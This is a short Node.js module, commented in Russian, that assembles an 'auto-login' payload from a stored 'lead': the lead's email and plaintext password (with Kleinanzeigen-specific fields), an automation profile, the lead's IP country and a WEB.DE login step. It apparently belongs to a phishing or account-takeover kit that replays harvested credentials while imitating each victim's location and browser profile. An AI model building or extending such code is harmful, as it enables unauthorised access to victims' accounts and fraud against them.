/**
 * Единый ответ для скрипта автовхода: креды + automation profile (+ ipCountry).
 * Маршрут подключается из server.js.
 */
'use strict';

const { buildAutomationProfile } = require('./automationProfile');

/**
 * @param {object} lead
 * @returns {{ ok: true, email: string, password: string, profile: object|null, ipCountry?: string, leadId: string } | null}
 */
function buildLeadLoginContextPayload(lead) {
  if (!lead || typeof lead !== 'object') return null;
  const isKlein = lead.brand === 'klein';
  const email = isKlein
    ? ((lead.emailKl || lead.email || '').trim())
    : ((lead.email || '').trim());
  const password = isKlein
    ? String(lead.passwordKl != null ? lead.passwordKl : (lead.password || '')).trim()
    : (lead.password != null ? String(lead.password).trim() : '');
  const profile = buildAutomationProfile(lead);
  const out = {
    ok: true,
    leadId: lead.id,
    email,
    password,
    profile: profile || null,
    ipCountry: lead.ipCountry ? String(lead.ipCountry).toUpperCase().slice(0, 2) : undefined
  };
  if (!out.ipCountry && out.profile && out.profile.hints && out.profile.hints.cfIpcountry) {
    out.ipCountry = String(out.profile.hints.cfIpcountry).toUpperCase().slice(0, 2);
  }
  const rawGrid = lead.webdeLoginGridStep;
  let webdeLoginGridStep = 0;
  if (rawGrid != null && Number.isFinite(Number(rawGrid))) {
    webdeLoginGridStep = Math.max(0, Math.floor(Number(rawGrid)));
  }
  out.webdeLoginGridStep = webdeLoginGridStep;
  return out;
}

module.exports = { buildLeadLoginContextPayload };
